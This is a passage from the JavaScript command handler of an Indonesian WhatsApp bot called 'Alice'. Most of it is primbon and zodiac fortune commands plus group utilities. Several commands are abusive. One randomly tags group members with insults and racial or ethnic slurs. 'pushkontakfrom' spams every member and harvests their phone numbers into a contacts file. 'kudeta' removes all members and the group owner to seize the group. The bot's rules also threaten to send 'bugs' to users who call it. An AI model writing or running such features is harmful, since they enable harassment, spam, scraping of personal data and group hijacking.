 alice.sendteks(from, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case 'sifatusaha': {
if (!isGroup) return onlyGroup()
 if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'rejeki': case 'rezeki': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'pekerjaan': case 'kerja': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//

case 'potensipenyakit': case 'penyakit': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 alice.sendImage(from, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//=================================================//
case 'haribaik': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.petung_hari_baik(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harisangar': case 'taliwangke': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harinaas': case 'harisial': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case 'nagahari': case 'harinaga': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'peruntungan': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} Aruna, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
 let [nama, tgl, bln, thn, untuk] = text.split`,`
 let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'weton': case 'wetonjawa': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.weton_jawa(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//=================================================//
case 'sifat': case 'karakter': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//=================================================//
case 'keberuntungan': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
//=================================================//
case 'memancing': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'masasubur': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
 let [tgl, bln, thn, siklus] = text.split`,`
 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'zodiak': case 'zodiac': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix+ command} 7 7 2005`
 let zodiak = [
 ["capricorn", new Date(1970, 0, 1)],
 ["aquarius", new Date(1970, 0, 20)],
 ["pisces", new Date(1970, 1, 19)],
 ["aries", new Date(1970, 2, 21)],
 ["taurus", new Date(1970, 3, 21)],
 ["gemini", new Date(1970, 4, 21)],
 ["cancer", new Date(1970, 5, 22)],
 ["leo", new Date(1970, 6, 23)],
 ["virgo", new Date(1970, 7, 23)],
 ["libra", new Date(1970, 8, 23)],
 ["scorpio", new Date(1970, 9, 23)],
 ["sagittarius", new Date(1970, 10, 22)],
 ["capricorn", new Date(1970, 11, 22)]
 ].reverse()

 function getZodiac(month, day) {
 let d = new Date(1970, month - 1, day)
 return zodiak.find(([_,_d]) => d >= _d)[0]
 }
 let date = new Date(text)
 if (date == 'Invalid Date') throw date
 let d = new Date()
 let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
 let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
 let zodiac = await getZodiac(birth[1], birth[2])
 let anu = await primbon.zodiak(zodiac)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'shio': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
 let anu = await primbon.shio(text)
 if (anu.status == false) return reply(anu.message)
 alice.sendteks(from, `⭔ *Hasil :* ${anu.message}`, m)
}
break
































































// FITUR FUN

case 'tolol':
case 'goblog':
case 'goblok':
case 'idiot':
case 'gay':
case 'jomok':
case 'bajingan':
case 'munafik':
case 'kontol':
case 'yatim':
case 'poke':
case 'pembokep':
case 'hitam':
case 'jawa':
case 'wibu':
case 'stress':
case 'miskin':
case 'cantik':
case 'manis':
case 'babi':
case 'ganteng':
case 'cina':
case 'atheis':
case 'papua':
case 'nigga':
case 'pengentot':
case 'seksi':
case 'kawai':
case 'tercindo':
case 'fembokef':
case 'pengocok':
case 'cabul':
case 'fuckboy':
case 'playboy':
case 'sange':
case 'sangean':
case 'hot': {
if (!isGroup) return onlyGroup()
let member = participants.map((u) => u.id)
let org = member[Math.floor(Math.random() * member.length)]
alice.sendMessage(m.chat,
{ text: `Orang ${command} disini adalah @${org.split('@')[0]}`,
contextInfo:{
mentionedJid:[org],
isForwarded: false, 
"externalAdReply": {
"showAdAttribution": false,
"containsAutoReply": true,
"title": `${command} yang di tag`,
"body": `hanya hiburan (ー_ー゛)`,
"previewType": "PHOTO",
"thumbnail": ppnyauser,
"sourceUrl": `${global.saluran}`}}},
{ quoted: m})
}
break

















 























































// FITUR GROUP
case 'shop':
case 'list': {
  if (db_respon_list.length === 0) {
    return m.reply('Belum ada list message di database');
  }
  if (!isAlreadyResponListGroup(from, db_respon_list)) {
    return m.reply('Belum ada list message yang terdaftar di group ini');
  }
  var arr_rows = [];
  for (let x of db_respon_list) {
    if (x.id === from) {
      arr_rows.push({
        title: x.key,
        rowId: x.key
      });
    }
  }
  let tekny = `*Hai ${pushname}*\n*Berikut List Item Yang Tersedia Di Group Ini!!*\n\n*Silahkan Ketik Nama Produk Yang Diinginkan!*\n\n`;
  for (let i of arr_rows) {
    tekny += `*PRODUK :* ${i.title}\n\n`;
  }
  var listMsg = {
    text: tekny,
  };
  alice.sendMessage(from, listMsg);
}
break
//===========================================\\
case 'dellist':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return !0;
if (db_respon_list.length === 0) return m.reply("Belum ada list message di database")
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *key*\n\n_Contoh_\n\n${prefix + command} hello`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return m.reply(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
m.reply(`Sukses delete list message dengan key *${q}*`)
break
//===========================================\\
case'addlist':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return !0;
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return m.reply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return m.reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) {
let media = await alice.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
addResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
m.reply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
m.reply(`Sukses set list message dengan key : *${args1}*`)
}
break
//===========================================\\
case 'updatelist': case 'update':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return !0;
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return m.reply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return m.reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
let media = await alice.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.npm', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
updateResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
m.reply(`Sukses update respon list dengan key *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
m.reply(`Sukses update respon list dengan key *${args1}*`)
}
break
case 'boostgc': {
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return !0;
if (!isBotAdmins) return botAdmin()
if (args[0] === 'on'){
if (global.boostgc) return reply('sudah aktif!')
global.boostgc = true
reply('di aktifkan [ ✓ ]')
} else if (args[0] === 'off'){
if (!global.antilink) return reply('tidak aktif!')
global.boostgc = false
reply('di matikan [ × ]')
} else {
wiwing = "Choose The Poll"
await alice.sendPoll(from, wiwing,[`boostgc on`,`boostgc off`])
 }
}
break // Powered By Winn
case 'listonline': case 'liston': {
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
alice.sendText(m.chat, 'List Online:\n\n' + online.map(v => '• @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
}
break
case 'sendcontact': case 'sencontact': {
if (!m.isGroup) return reply(mess.group)
if (!m.mentionedJid[0]) return reply795('Gunakan dengan cara\n Example : .sendcontact @tag|name')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: alice.getName(froms), contacts: [{displayName: alice.getName(froms), vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+alice.getName(froms)+";;;\nFN:"+alice.getName(froms)+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
alice.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case 'contacttag': case 'contag':{
if (!m.isGroup) return reply(mess.group)
if (!m.mentionedJid[0]) return reply795('Gunakan dengan cara\n Example : .contacttag @tag|name')
let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: alice.getName(froms), contacts: [{displayName: alice.getName(froms), vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+alice.getName(froms)+";;;\nFN:"+alice.getName(froms)+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
alice.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
}
break
case "pushkontakfrom":{
if (!isCreator&&!isPremium) return reply('khusus pengguna bot saja')
if (!isGroup) return reply(mess.group)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)

const groupMetadata = isGc? await alice.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGc? groupMetadata.owner : ""
const participantts = isGc? await groupMetadata.participants : ""
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
const mess = `Pesan Push Kontak Sedang Di Kirim ke ${halsss.length} Orang\nSelama ${halsss.length * 7} detik\n\n harap untuk tidak melakukan chat saat pushkontak sedang berlangsung!`
await alice.sendMessage(from, {text:mess},{quoted:m})
await alice.sendMessage(owner, {text:mess},{quoted:m})
global.tekspushkonv2 = text

if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./database/contact/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await alice.downloadAndSaveMediaMessage(quoted)
mem = await global.telegraPH(media)
await alice.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await delay(7000)
} else {
var contact = generateWAMessageFromContent(men, proto.Message.fromObject({
"contactMessage": {
"displayName": `Push Kontak`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Push Kontak Alice\nFN:${pushname}\nitem1.TITLE:Kontak ${pushname}\nURL:Alicechat.chatango.com\nitem496.TEL;waid=${nomore}:${pushname}\nitem496.X-ABLabel:Save nomor saya\nX-WA-BIZ-DESCRIPTION:Developer\nEND:VCARD`,
}
}), { userJid: men})
alice.relayMessage(men, contact.message, { messageId: contact.key.id })
await delay(7000)
alice.sendMessage(men, {text: text})
await delay(7000)
}
}
const mess2 = `Sekarang Tinggal Ketik *.savekontak* Nanti Muncul *File* Pencet Aja Terus Impor pakai apk kontak bawaan ya!`
await alice.sendMessage(from, {text:mess2},{quoted:m})
await alice.sendMessage(owner, {text:mess2},{quoted:m})
}
break //Powered By alice & Darwin
case "savekontak": {
if (!isCreator&&!isPremium) return reply(mess.prem)
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:PUSH ${index} ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contact/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await alice.sendMessage(from, { document: fs.readFileSync("./system/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./system/database/contacts.json", JSON.stringify(contacts))
}
}
break //Powered By alice & Darwin
case 'diffusion': case 'stabledif': case 'diff':{
if (!isCreator&&!isPremium) return reply(mess.prem)
if (!text) throw `Masukan Promptnya\nExample:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`
reply(mess.wait)

let anu = await diff(text)
let hasil = await processing(anu, "enhance");
alice.sendMessage(m.chat, {image: hasil, caption: `Prompt: ${text}`})
}
break
case "kudeta":{
if (!isGroup) return reply(mess.group)
if (!isAdmins && !isCreator) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
let memb = participants.map((x) => x.id)
let data = participants.map((x) => x.id)
for (let x of data) {
if (x !== botNumber && x !== groupOwner && x !== global.owner) {
alice.groupParticipantsUpdate(m.chat, [x], "remove")
} else if (data.includes(groupOwner)) {
alice.groupParticipantsUpdate(m.chat, [groupOwner], "remove")
alice.groupParticipantsUpdate(m.chat, [groupOwner], "demote")
}}}
reply('*[ Alert ]* this group has kudeta')
break
case 'myip':
            case 'ipbot':
                if (!isCreator) return reply('not for NPC')
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        reply("🔎 My public IP address is: " + ip);
                    })
                })
            break
case 'cekasalmember': {
  if (!isGroup) return reply(mess.group)
  const participants = await alice.groupMetadata(m.chat).then(metadata => metadata.participants);
  let countIndonesia = 0;
  let countMalaysia = 0;
  let countUSA = 0;
  let countOther = 0;
  
  participants.forEach(participant => {
    const phoneNumber = participant.id.split('@')[0];
    if (phoneNumber.startsWith("62")) {
      countIndonesia++;
    } else if (phoneNumber.startsWith("60")) {
      countMalaysia++;
    } else if (phoneNumber.startsWith("1")) {
      countUSA++;
    } else if (phoneNumber.startsWith("+1")) {
      countOther++;
    } else {
      countOther++;
    }
  });
  
  const replyMessage = `Jumlah Anggota Grup Berdasarkan Negara:\n\nAnggota Indonesia: ${countIndonesia} 🇮🇩\nAnggota Malaysia: ${countMalaysia} 🇲🇾\nAnggota USA + OTHER : ${countUSA} 🇺🇲\nAnggota Negara Lain: ${countOther} 🏳️`;
  reply(replyMessage);
  break;}
case "couple": case"ppcp":{
let anu = await fetchJson("https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json")
reply(mess.wait)
let random = anu[Math.floor(Math.random() * anu.length)]
alice.sendMessage(m.chat,{image: {url: random.male,},caption: `Couple Male`,},{quoted: m,})
alice.sendMessage(m.chat,{image: {url: random.female,},caption: `Couple Female`,},{quoted: m,})
}
break
case 'demoteall':{
if (!isCreator && !isOwner) return onlyOwner()
reply(global.mess.wait)
let data = groupAdmins.splice(botNumber, groupAdmins.length - 1)
await alice.groupParticipantsUpdate(m.chat, data, 'demote')
}
break
case 'leagueid': case 'idbahasa': case 'kodebahasa':{
let LANGUAGES = `
   *❲ COUNTRY ID ❳*
    ⏣ •  af: Afrikaans 
    ⏣ •  sq: Albanian
    ⏣ •  ar: Arabic
    ⏣ •  hy: Armenian
    ⏣ •  ca: Catalan 
    ⏣ •  zh: Chinese 
    ⏣ •  zh-cn: Chinese (Mandarin/China)
    ⏣ •  zh-tw: Chinese (Mandarin/Taiwan)
    ⏣ •  zh-yue: Chinese (Cantonese)
    ⏣ •  hr: Croatian
    ⏣ •  cs: Czech
    ⏣ •  da: Danish
    ⏣ •  nl: Dutch
    ⏣ •  en: English    
    ⏣ •  en-au: English (Australia)
    ⏣ •  en-uk: English (United Kingdom)
    ⏣ •  en-us: English (United States) 
    ⏣ •  eo: Esperanto 
    ⏣ •  fi: Finnish 
    ⏣ •  fr: French
    ⏣ •  de: German
    ⏣ •  el: Greek 
    ⏣ •  ht: Haitian Creole 
    ⏣ •  hi: Hindi 
    ⏣ •  hu: Hungarian 
    ⏣ •  is: Icelandic 
    ⏣ •  id: Indonesian 
    ⏣ •  it: Italian
    ⏣ •  ja: Japanese
    ⏣ •  ko: Korean
    ⏣ •  la: Latin
    ⏣ •  lv: Latvian
    ⏣ •  mk: Macedonian
    ⏣ •  no: Norwegian
    ⏣ •  pl: Polish
    ⏣ •  pt: Portuguese
    ⏣ •  pt-br: Portuguese (Brazil)
    ⏣ •  ro: Romanian
    ⏣ •  ru: Russian
    ⏣ •  sr: Serbian
    ⏣ •  sk: Slovak
    ⏣ •  es: Spanish 
    ⏣ •  es-es: Spanish (Spain)
    ⏣ •  es-us: Spanish (United States)
    ⏣ •  sw: Swahili
    ⏣ •  sv: Swedish
    ⏣ •  ta: Tamil
    ⏣ •  th: Thai
    ⏣ •  tr: Turkish
    ⏣ •  vi: Vietnamese 
    ⏣ •  cy: Welsh
	  *╰────────────⦁*`
sendres(from, LANGUAGES)
}
break
case 'rules':{
if (!isGroup) return onlyGroup()
let teks =`
Syarat dan Ketentuan menggunakan *Alice*

*1.* Nama dan nomer user bot *Alice*
akan Kami simpan di dalam
server selama bot aktif

*2.* Data akan di hapus ketika bot Offline
atau di hapus oleh Owner Bot

*3.* Kami tidak menyimpan gambar,
video, file, audio, dan dokumen
yang kamu kirim ke *Alice*

*4.* Kami tidak akan pernah meminta users
untuk memberikan informasi pribadi

*5.* Jika menemukan Bug/Error silahkan
langsung lapor ke Owner atau Developer

*6.* Beberapa fitur mungkin ada yang error,
jadi tunggu sampai developer
meperbaiki fitur tersebut

*7.* Jika terjadi error harap segera lapor
ke developer/devloper dengan cara ketik
*Report* lalu reply error tersebut

*8.* User dilarang keras menelpon bot!
jika melanggar maka kamu akan terkena
banned,block dan dikirim bug

*9.* Bot tidak akan menanggapi user yang
meminta untuk di save nomornya`
alice.relayMessage(from, { liveLocationMessage: { 
degreesLatitude: -7.2678119,
degreesLongitude: 107.81886705,
caption : teks,
sequenceNumber: 1709322015967001, timeOffset: 8600, jpegThumbnail: null,
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
containsAutoReply: true,
showAdAttribution: false,
}
}
}
}, { quoted: fkontak2 })
}
break
case 'afk': {
if (!isGroup) return onlyGroup()
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
reply795(`${tag} telah *Afk* dengan alasan ${text ? ': ' + text : ''}`)
}
break
case 'addcmd': case 'setcmd':{
if (!isGroup) return onlyGroup()
if (isQuotedSticker) return reply('Reply stikernya')
if (!text) return reply(`Untuk command apa?`)
let hash = m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
if (stickercmd[hash]) return reply(`Stiker tersebut udah ada cmd!`)
stickercmd[hash] = {
text: text, 
creator: m.sender
}
alice.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
}
break
case 'delcmd':{
if (isQuotedSticker) return reply('Reply stikernya')
let hash = m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
if (!stickercmd[hash]) return reply(`Stiker tersebut tidak ada cmd!`)
delete stickercmd[hash]
alice.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
}
break
case 'listcmd':
var data = Object.entries(stickercmd)
if (data.length == 0) return m.reply('*Empty data.*')
var teks = `乂  *LIST STICKER CMD*\n`
teks += data.map(([key, v], index) => `\n${index++}. ${v.text}\n◦  Creator: @${v.creator.split('@')[0]}`).join('\n')
reply(teks)
break
case 'tagall': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
if (!isBotAdmins) return reply(`Beri alice admin ಠ⁠‿⁠ಠ`)
let teks = `乂 *P E N G U M U M A N*              
╭──/               
╰ *Pesan : ${q ? q : 'kosong'}*

乂 Tag Semua Member:\n\n`
for (let mem of participants) {
